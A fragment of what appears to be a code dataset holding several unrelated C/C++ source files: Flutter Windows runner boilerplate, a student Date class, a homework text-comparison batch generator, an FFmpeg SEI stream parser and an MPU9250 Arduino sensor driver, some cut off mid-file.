user{}?\",\n                                selectedUsers.size(), selectedUsers.size() > 1 ? \"s\" : \"\"),\n                    \"Back\", \"Unblock\"\n            );\n            modal->setTag(TAG_CONFIRM_UNBLOCK);\n            modal->m_button2->updateBGImage(\"GJ_button_05.png\");\n        }\n\n      ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//*****************************************************************************************************\n//      Date Class Implementation File\n//\n//      This class implementation file defines the methods (member functions) of the Date class.\n//\n//      Other files required:\n//        1.  date.h - header file for Date class\n//\n//*****************************************************************************************************\n\n#include \"date.h\"\n#include <iostream>\n\n//*****************************************************************************************************\n// default constructor initializes member variables\n\nDate::Date() {\n    day = 1;\n    month = 1;\n    year = 2000;\n}\n\n//*****************************************************************************************************\n\nDate::~Date() {\n    std::cout << \"\\nDate object destroyed\\n\";\n}\n\n//*****************************************************************************************************\n// checks for valid date (leap years, days in month) and sets date\n\nvoid Date::inputDate() {\n    std::cout << \"\\nEnter Year: \";\n    std::cin >> year;\n\n    while (year < 2022 || year > 2100) {\n        std::cerr << \"\\nInvalid\\n\\n\";\n        std::cout << \"Enter Year(2022- ): \";\n        std::cin >> year;\n    }\n\n    setYear(year);\n\n    std::cout << \"Enter Month: \";\n    std::cin >> month;\n\n    while (month < 1 || month > 12) {\n        std::cerr << \"\\nInvalid\\n\\n\";\n        std::cout << \"Enter Month(1-12): \";\n        std::cin >> month;\n    }\n\n    setMonth(month);\n\n    std::cout << \"Enter Day: \";\n    std::cin >> day;\n\n    if (month == 1 || month == 3 || month == 5 || month == 7 ||\n        month == 8 || month == 10 || month == 12) {\n        while (day < 1 || day > 31) {\n            std::cerr << \"\\nInvalid\\n\\n\";\n            std::cout << \"Enter Day(1-31): \";\n            std::cin >> day;\n        }\n    } else if (month == 4 || month == 6 || month == 9 || month == 11) {\n        while (day < 1 || day > 30) {\n            std::cerr << \"\\nInvalid\\n\\n\";\n            std::cout << \"Enter Day(1-30): \";\n            std::cin >> day;\n        }\n    } else if (year % 4 == 0) {     // February :: tests leap years\n        while (day < 1 || day > 29) {\n            std::cerr << \"\\nInvalid\\n\\n\";\n            std::cout << \"Enter Day(1-29): \";\n            std::cin >> day;\n        }\n    } else {\n        while (day < 1 || day > 28) {\n            std::cerr << \"\\nInvalid\\n\\n\";\n            std::cout << \"Enter Day(1-28): \";\n            std::cin >> day;\n        }\n    }\n\n    setDay(day);\n}\n\n//*****************************************************************************************************\n\nvoid Date::displayDate() {\n    std::cout << getMonth() << \"/\" << getDay() << \"/\" << getYear();\n}\n\n//*****************************************************************************************************",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"latihan_praktek_m03\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <cstdio>\r\n#include <string>\r\n#include \"txt-compare-tool.h\"\r\nusing namespace std;\r\n\r\n//////////////\u6b64\u51fd\u6570\u7528\u4e8e\u8f93\u51fa\u8bf4\u660e///////////////\r\nvoid Readme()\r\n{\r\n    cout << \"        ###########################################################################################\" << endl;\r\n    cout << \"        #      txt-compare-tool v1.3                                                              #\" << endl;\r\n    cout << \"        # \u300a\u540c\u6d4e\u5927\u5b66\u9ad8\u7a0b\u4f5c\u4e1a\u6587\u672c\u6821\u5bf9\u6279\u5904\u7406\u6587\u4ef6\u751f\u6210\u5de5\u5177\u300b\u4f7f\u7528\u8bf4\u660e\uff1a                                #\" << endl;\r\n    cout << \"        # 1.\u6d4b\u8bd5\u6570\u636e\u6587\u4ef6\u9700\u8981\u547d\u540d\u683c\u5f0f\u4e3a\u201ctest-data8.txt\u201d\uff0c\u5185\u90e8\u683c\u5f0f\u540c\u8001\u5e08get_input_data.exe\u8981\u6c42    #\" << endl;\r\n    cout << \"        #   \u5df2\u6709\u81ea\u52a8\u751f\u6210\u6d4b\u8bd5\u6570\u636e\u6587\u4ef6\u6a21\u677f\u529f\u80fd\uff0c\u5728\u7b2c\u56db\u6b65\u9009\u62e9\u201c\u662f\u201d\u5373\u53ef\u81ea\u52a8\u751f\u6210\u6a21\u677f                  #\" << endl;\r\n    cout << \"        #  \uff08\u5176\u4e2d\u76843\u548c8\u5e94\u66ff\u6362\u6210\u4f60\u9700\u8981\u7684\u4f5c\u4e1a\u7f16\u53f7\uff0c\u4e0b\u540c\uff09                                           #\" << endl;\r\n    cout << \"        # 2.\u8001\u5e08\u7ed9\u7684demo\u7a0b\u5e8f\u547d\u540d\u683c\u5f0f\u5e94\u4e3a\u20183-b8-demo.exe\u2019\uff0c\u5982\u679c\u6709c\u8bed\u8a00\u7248\u672c\u5219\u4e3a\u20183-b8-demo-c.exe\u2019 #\" << endl;\r\n    cout << \"        # 3.\u4f60\u7684c++\u7a0b\u5e8f\u547d\u540d\u683c\u5f0f\u5e94\u4e3a\u20183-b8-1.exe\u2019,\u5982\u679c\u6709dev\u7248\u672c\u5219\u4e3a\u20183-b8-1-dev.exe\u2019             #\" << endl;\r\n    cout << \"        # 4.\u4f60\u7684c\u7a0b\u5e8f\u547d\u540d\u683c\u5f0f\u5e94\u4e3a\u20183-b8-2.exe\u2019,\u5982\u679c\u6709dev\u7248\u672c\u5219\u4e3a\u20183-b8-2-dev.exe\u2019               #\" << endl;\r\n    cout << \"        # 5.\u8001\u5e08\u7684get_input_data.exe\u548ctxt_compare.exe\u5e94\u5df2\u53ef\u7528(\u53ef\u5728\u50a8\u5b58\u5e93\u5185\u4e0b\u8f7d)                   #\" << endl;\r\n    cout << \"        # 6.\u4ee5\u4e0a\u6587\u4ef6\u548c\u672c\u5de5\u5177\u5e94\u5728\u540c\u4e00\u76ee\u5f55\u4e0b                                                        #\" << endl;\r\n    cout << \"        # 7.bug\u53cd\u9988\u9014\u5f84\u89c1\u50a8\u5b58\u5e93                                                                   #\" << endl;\r\n    cout << \"        # 8.\u672c\u5de5\u5177\u63d0\u4f9b\u7684\u7ed3\u679c\u4ec5\u4f9b\u53c2\u8003\uff0c\u5982\u679c\u9020\u6210\u4efb\u4f55\u4f5c\u4e1a\u76f8\u5173\u95ee\u9898\u5f00\u53d1\u8005\u6982\u4e0d\u8d1f\u8d23                      #\" << endl;\r\n    cout << \"        #                                                                                         #\" << endl;\r\n    cout << \"        #          \u50a8\u5b58\u5e93\u94fe\u63a5\uff08\u66f4\u65b0\u4e0b\u8f7d\uff09https://github.com/gfjdh/txt-compare-tool                #\" << endl;\r\n    cout << \"        ###########################################################################################\" << endl << endl;\r\n}\r\n\r\n\r\n//////////////\u6b64\u51fd\u6570\u7528\u4e8e\u5408\u6210\"\u8fd0\u884c\u4f5c\u4e1aexe\u7684\u6307\u4ee4\"\u7684\u5b57\u7b26\u4e32///////////////\r\nstring createExeRunCommand(int a,int b,int c,string n,string r)   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cc\u4e3a\u6570\u636e\u6570\uff0cn\u4e3aexe\u7a0b\u5e8f\u540e\u7f00\uff0cr\u4e3areslut\u540e\u7f00\r\n{\r\n    string result;\r\n    int i = 1;\r\n    if (c == 0)\r\n        result = to_string(a) + \"-b\" + to_string(b) + n + \".exe >   \" + to_string(a) + \"-b\" + to_string(b) + \"-result\" + r + \".txt\\n\";\r\n    else\r\n    {       \r\n        result = \"get_input_data test-data\" + to_string(b) + \".txt [\" + to_string(a) + \"-b\" + to_string(b) + \"-0\" + to_string(i);\r\n        result += \"] | \" + to_string(a) + \"-b\" + to_string(b) + n + \".exe >   \" + to_string(a) + \"-b\" + to_string(b) + \"-result\" + r + \".txt\\n\";\r\n    }\r\n\r\n    for (i = 2; i <= c; i++)\r\n    {\r\n        if(i<=9)//\u4e3b\u8981\u662f\u4e3a\u4e86\u201c-0\u201d\r\n            result += \"get_input_data test-data\" + to_string(b) + \".txt [\" + to_string(a) + \"-b\" + to_string(b) + \"-0\" + to_string(i);\r\n        else\r\n            result += \"get_input_data test-data\" + to_string(b) + \".txt [\" + to_string(a) + \"-b\" + to_string(b) + \"-\" + to_string(i);\r\n        \r\n        result += \"] | \" + to_string(a) + \"-b\" + to_string(b) + n + \".exe >>  \" + to_string(a) + \"-b\" + to_string(b) + \"-result\" + r + \".txt\\n\";\r\n    }\r\n\r\n    return result;\r\n}\r\n\r\n//////////////\u6b64\u51fd\u6570\u7528\u4e8e\u5408\u6210\"\u5bf9\u6bd4\u7ed3\u679ctxt\u7684\u6307\u4ee4\"\u7684\u5b57\u7b26\u4e32///////////////\r\nstring createTxtComparisonCommand(int a, int b, string r1, string r2, string c)   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cr1\u4e3a\u7b2c\u4e00\u4e2atxt\u540e\u7f00\uff0cr2\u4e3a\u7b2c\u4e8c\u4e2atxt\u540e\u7f00, c\u4e3a\u7528\u6237\u6307\u5b9a\u7684\u53c2\u6570\r\n{\r\n    string result;\r\n    result = \"txt_compare --file1 \" + to_string(a) + \"-b\" + to_string(b) + \"-result\"+ r1 +\".txt --file2 \" \r\n            + to_string(a) + \"-b\" + to_string(b) + \"-result\"+ r2 +\".txt --display detailed \"+ c +\"\\n\";    \r\n    return result;\r\n}\r\n\r\n//////////////\u6b64\u51fd\u6570\u7528\u4e8e\u5220\u9664\"\u5bf9\u6bd4\u7ed3\u679ctxt\u7684\u6307\u4ee4\"\u7684\u5b57\u7b26\u4e32///////////////\r\nstring createTxtDeleteCommand(int a, int b, string r)   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cr\u4e3atxt\u540e\u7f00\r\n{\r\n    string result;\r\n    result = \"del \" + to_string(a) + \"-b\" + to_string(b) + \"-result\" + r + \".txt\\n\";\r\n    return result;\r\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string>\n#include <iostream>\n#include <fcntl.h>\n#include <io.h>\nextern \"C\" {\n    #include <libavcodec/avcodec.h>\n    #include <libavformat/avformat.h>\n    #include <libavcodec/bsf.h>\n    #include <libswscale/swscale.h>\n}\n\n//#define DEV\n\nenum class MessageType : uint8_t {\n    PARAMETER = 0,\n    IMAGE_FRAME = 1,\n    SEI = 2,\n    END = 3\n};\n\nchar av_error[AV_ERROR_MAX_STRING_SIZE] = { 0 };\n#define av_err2str(errnum) av_make_error_string(av_error, AV_ERROR_MAX_STRING_SIZE, errnum)\n\nint main(int argc, char* argv[]) {\n    // \u8bbe\u7f6estdout\u4e3a\u4e8c\u8fdb\u5236\u6a21\u5f0f\uff0c\u5426\u5219\u7a0b\u5e8f\u4f1a\u8f6c\u4e49\u56fe\u50cf\u6570\u636e\u9020\u6210\u63a5\u6536\u7aef\u753b\u9762\u4ea7\u751f\u3010\u626d\u66f2/\u504f\u79fb\u3011\u5f02\u5e38\n#ifdef _WIN32\n    _setmode(_fileno(stdout), _O_BINARY);\n#else\n    freopen(NULL, \"wb\", stdout);\n#endif\n    AVFormatContext* fmt_ctx = NULL;\n    AVCodecContext* codec_ctx = NULL;\n    const AVCodec* codec = NULL;\n    const size_t message_type_size = 1;\n    const size_t parameter_type_size = 4;\n    const size_t sei_len_size = 4;\n    int ret;\n    //const char* url = \"E:/rtsp/rtsp.sei.flv\";\n#ifdef DEV\n    const char* url = \"rtmp://localhost/live/livestream\";\n#else\n    if (argc < 2) {\n        std::cerr << \"argc mismatch\" << std::endl;\n        std::cerr << \"Usage: ./ffmpeg_sei_parse rtmp_url\" << std::endl;\n        return 1;\n    }\n    const char* url = argv[1];\n#endif\n    avformat_network_init();\n    ret = avformat_open_input(&fmt_ctx, url, NULL, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error opening input file%s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    ret = avformat_find_stream_info(fmt_ctx, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error finding stream info: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    int video_stream_index = -1;\n    for (unsigned int i = 0; i < fmt_ctx->nb_streams; i++) {\n        if (fmt_ctx->streams[i]->codecpar->codec_type == AVMEDIA_TYPE_VIDEO) {\n            video_stream_index = static_cast<int>(i);\n            break;\n        }\n    }\n\n    if (video_stream_index == -1) {\n        std::cerr << \"Could not find video stream\" << std::endl;\n        avformat_close_input(&fmt_ctx);\n        return -1;\n    }\n\n    AVCodecParameters* codecParams = fmt_ctx->streams[video_stream_index]->codecpar;\n    uint32_t width = codecParams->width;\n    uint32_t height = codecParams->height;\n    MessageType message_type = MessageType::PARAMETER;\n    fwrite(&message_type, message_type_size, 1, stdout);\n    // \u5c06\u5bbd\u5ea6\u9ad8\u5ea6\u4f20\u9012\u7ed9\u63a5\u6536\u65b9\uff0c\u4ee5\u4fbf\u540e\u7eed\u77e5\u9053\u6bcf\u4e00\u5e27\u8981\u8bfb\u53d6\u591a\u5c11\u5b57\u8282\u7684\u56fe\u7247\u6570\u636e\n    fwrite(&width, parameter_type_size, 1, stdout);\n    fwrite(&height, parameter_type_size, 1, stdout);\n\n    codec = avcodec_find_decoder(fmt_ctx->streams[video_stream_index]->codecpar->codec_id);\n    if (!codec) {\n        fprintf(stderr, \"Codec not found\\n\");\n        return 1;\n    }\n\n    codec_ctx = avcodec_alloc_context3(codec);\n    if (!codec_ctx) {\n        fprintf(stderr, \"Could not allocate codec context\\n\");\n        return 1;\n    }\n\n    ret = avcodec_parameters_to_context(codec_ctx, fmt_ctx->streams[video_stream_index]->codecpar);\n    if (ret < 0) {\n        fprintf(stderr, \"Error setting codec parameters: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    ret = avcodec_open2(codec_ctx, codec, NULL);\n    if (ret < 0) {\n        fprintf(stderr, \"Error opening codec: %s\\n\", av_err2str(ret));\n        return 1;\n    }\n\n    av_dump_format(fmt_ctx, video_stream_index, url, 0);\n\n    AVPacket *pkt = av_packet_alloc();\n    pkt->data = NULL;\n    pkt->size = 0;\n    SwsContext* sws_ctx = NULL;\n    message_type = MessageType::IMAGE_FRAME;\n    while (av_read_frame(fmt_ctx, pkt) >= 0) {\n        if (pkt->stream_index == video_stream_index) {\n            AVFrame* frame = av_frame_alloc();\n            ret = avcodec_send_packet(codec_ctx, pkt);\n            if (ret < 0) {\n                fprintf(stderr, \"Error sending packet to decoder: %s\\n\", av_err2str(ret));\n                goto end;\n            }\n            while (avcodec_receive_frame(codec_ctx, frame) >= 0) {\n                AVFrameSideData* sei_sd = av_frame_get_side_data(frame, AV_FRAME_DATA_SEI_UNREGISTERED);\n                if (sei_sd) {\n                    message_type = MessageType::SEI;\n                    fwrite(&message_type, message_type_size, 1, stdout);\n                    uint32_t sei_len = strlen((char*)(sei_sd->data + 16));\n                    fwrite(&sei_len, sei_len_size, 1, stdout);\n                    fwrite(sei_sd->data + 16, sei_len, 1, stdout);\n                    fflush(stdout);\n                    //fprintf(stdout, \"SEI Data:\\n\");\n                    //std::cout << sei_sd->data + 16 << std::endl;\n                }\n                if (!sws_ctx) {\n                    sws_ctx = sws_getContext(frame->width, frame->height, (AVPixelFormat)frame->format,\n                        frame->width, frame->height, AV_PIX_FMT_BGR24,\n                        SWS_BILINEAR, NULL, NULL, NULL);\n                    if (!sws_ctx) {\n                        fprintf(stderr, \"Failed to initialize SwsContext for image conversion\\n\");\n                        goto end;\n                    }\n          ",
    "/*\nMPU9250.cpp\nShiven Patel\nshivenpatel399@gmail.com\n\nCopyright (c) 2024 Shiven Patel\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software \nand associated documentation files (the \"Software\"), to deal in the Software without restriction, \nincluding without limitation the rights to use, copy, modify, merge, publish, distribute, \nsublicense, and/or sell copies of the Software, and to permit persons to whom the Software is \nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or \nsubstantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING \nBUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND \nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, \nDAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"Arduino.h\"\n#include \"MPU9250.h\"\n\n/* MPU9250 object, input the I2C bus and address */\nMPU9250::MPU9250(TwoWire &bus,uint8_t address){\n  _i2c = &bus; // I2C bus\n  _address = address; // I2C address\n  _useSPI = false; // set to use I2C\n}\n\n/* MPU9250 object, input the SPI bus and chip select pin */\nMPU9250::MPU9250(SPIClass &bus,uint8_t csPin){\n  _spi = &bus; // SPI bus\n  _csPin = csPin; // chip select pin\n  _useSPI = true; // set to use SPI\n}\n\n/* starts communication with the MPU-9250 */\nint MPU9250::begin(){\n  if( _useSPI ) { // using SPI for communication\n    // use low speed SPI for register setting\n    _useSPIHS = false;\n    // setting CS pin to output\n    pinMode(_csPin,OUTPUT);\n    // setting CS pin high\n    digitalWrite(_csPin,HIGH);\n    // begin SPI communication\n    _spi->begin();\n  } else { // using I2C for communication\n    // starting the I2C bus\n    _i2c->begin();\n    // setting the I2C clock\n    _i2c->setClock(_i2cRate);\n  }\n  // select clock source to gyro\n  if(writeRegister(PWR_MGMNT_1,CLOCK_SEL_PLL) < 0){\n    return -1;\n  }\n  // enable I2C master mode\n  if(writeRegister(USER_CTRL,I2C_MST_EN) < 0){\n    return -2;\n  }\n  // set the I2C bus speed to 400 kHz\n  if(writeRegister(I2C_MST_CTRL,I2C_MST_CLK) < 0){\n    return -3;\n  }\n  // set AK8963 to Power Down\n  writeAK8963Register(AK8963_CNTL1,AK8963_PWR_DOWN);\n  // reset the MPU9250\n  writeRegister(PWR_MGMNT_1,PWR_RESET);\n  // wait for MPU-9250 to come back up\n  delay(1);\n  // reset the AK8963\n  writeAK8963Register(AK8963_CNTL2,AK8963_RESET);\n  // select clock source to gyro\n  if(writeRegister(PWR_MGMNT_1,CLOCK_SEL_PLL) < 0){\n    return -4;\n  }\n  // check the WHO AM I byte, expected value is 0x71 (decimal 113) or 0x73 (decimal 115)\n  if((whoAmI() != 113)&&(whoAmI() != 115)){\n    return -5;\n  }\n  // enable accelerometer and gyro\n  if(writeRegister(PWR_MGMNT_2,SEN_ENABLE) < 0){\n    return -6;\n  }\n  // setting accel range to 16G as default\n  if(writeRegister(ACCEL_CONFIG,ACCEL_FS_SEL_16G) < 0){\n    return -7;\n  }\n  _accelScale = G * 16.0f/32767.5f; // setting the accel scale to 16G\n  _accelRange = ACCEL_RANGE_16G;\n  // setting the gyro range to 2000DPS as default\n  